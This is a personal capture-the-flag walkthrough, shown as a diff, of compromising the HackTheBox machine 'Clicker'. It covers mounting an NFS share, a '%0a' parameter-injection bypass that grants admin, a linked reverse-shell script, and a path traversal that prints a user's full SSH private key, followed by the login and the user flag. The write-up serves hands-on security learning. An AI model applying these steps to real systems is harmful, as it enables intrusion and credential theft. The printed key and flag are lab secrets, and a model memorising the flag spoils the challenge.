@@ -51,3 +51,175 @@ there is a url
 
 inside the url there is a login.php and register.php
 
+2049/tcp says that it can be mounted 
+
+so first i create a directory mkdir -p /mnt/nfs_file_shares
+
+then i tried to connect the sharing directory using:
+    mount -o nolock 10.10.11.232:/ /mnt/nfs_file_shares 
+
+after i entered a shared directory /mnt/nfs_file_shares/mnt/backups
+
+there is a zip file inside clicker.htb_backup.zip
+
+copied it to my directory /home/kali/Desktop/CTF/Clicker and unpacked it using:
+    unzip clicker.htb_backup.zip 
+
+and enter it to see what is inside:
+    └─$ ls -la                                
+total 72
+drwxr-xr-x 4 kali kali 4096 Sep  1 16:21 .
+drwxr-xr-x 4 kali kali 4096 Jan 19 11:47 ..
+-rw-rw-r-- 1 kali kali 3934 Sep  1 16:18 admin.php
+drwxr-xr-x 4 kali kali 4096 Feb 28  2023 assets
+-rw-rw-r-- 1 kali kali  608 Sep  1 16:17 authenticate.php
+-rw-rw-r-- 1 kali kali  541 Sep  1 16:17 create_player.php
+-rw-rw-r-- 1 kali kali 2536 Sep  1 16:18 db_utils.php
+-rw-r--r-- 1 kali kali 1376 Sep  1 16:18 diagnostic.php
+-rw-rw-r-- 1 kali kali 1977 Sep  1 16:18 export.php
+drwxr-xr-x 2 kali kali 4096 Sep  1 16:18 exports
+-rw-rw-r-- 1 kali kali 3887 Sep  1 16:18 index.php
+-rw-rw-r-- 1 kali kali 3423 Sep  1 16:18 info.php
+-rw-rw-r-- 1 kali kali 3301 Sep  1 16:18 login.php
+-rw-rw-r-- 1 kali kali   74 Sep  1 16:17 logout.php
+-rw-rw-r-- 1 kali kali 3341 Sep  1 16:17 play.php
+-rw-rw-r-- 1 kali kali 3070 Sep  1 16:17 profile.php
+-rw-rw-r-- 1 kali kali 3333 Sep  1 16:18 register.php
+-rw-rw-r-- 1 kali kali  563 Sep  1 16:18 save_game.php
+
+
+looked at authenticate.php i found that there is 2 more parameters exept user and password, its nickname and role
+
+lets register account
+
+i tried to play, saved the game
+
+in burpsuit, in the request window there is:
+    GET /save_game.php?clicks=23&level=1 HTTP/1.1
+
+i tried to add the role parameter &role=Admin 
+
+and it returns me:
+    GET /index.php?err=Malicious%20activity%20detected! HTTP/1.1
+
+i found the way to bypass it by %0a inside role parameter:
+    role%0a=Admin
+ and get:
+    GET /index.php?msg=Game%20has%20been%20saved! HTTP/1.1
+
+so its saved the game with the admin role
+
+i reconnected to my account and get the admin portal
+
+now i can export the output to exports directorywith different formats
+
+i found script(https://github.com/x86trace/Clicker-HTB/blob/main/solve.py) that gives me reverse shell with www-data user
+
+cat /etc/passwd:
+    root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+jack:x:1000:1000:jack:/home/jack:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
+_rpc:x:115:65534::/run/rpcbind:/usr/sbin/nologin
+statd:x:116:65534::/var/lib/nfs:/usr/sbin/nologin
+_laurel:x:998:998::/var/log/laurel:/bin/false
+
+
+there is username jack
+
+ins /opt/manage i found executeble file execute_query
+
+after running it:
+    ./execute_query 1
+i get:
+    INSERT INTO players (username, nickname, password, role, clicks, level) 
+	VALUES ('admin', 'admin', 'ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82', 'Admin', 999999999999999999, 999999999)
+	ON DUPLICATE KEY UPDATE username=username
+
+with this tool i manage to open ssh key of jack:
+    /execute_query 5 ../.ssh/id_rsa:
+        --------------
+-----BEGIN OPENSSH PRIVATE KEY---
+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
+-----END OPENSSH PRIVATE KEY---
+--------------
+
+if i do complete copy-paste,it didnt connect me to ssh
+
+i created a ssh key by my own using ssh-keygen, copied the beginning of key and the end of key
+
+changed the chmod to 600 and tried to connect the ssh:
+    ssh -i id_rsa jack@10.10.11.232
+
+and it worked, the user flag:
+    6427bd0325f2d64d4fc156eebf839ef7
+
+
+
+
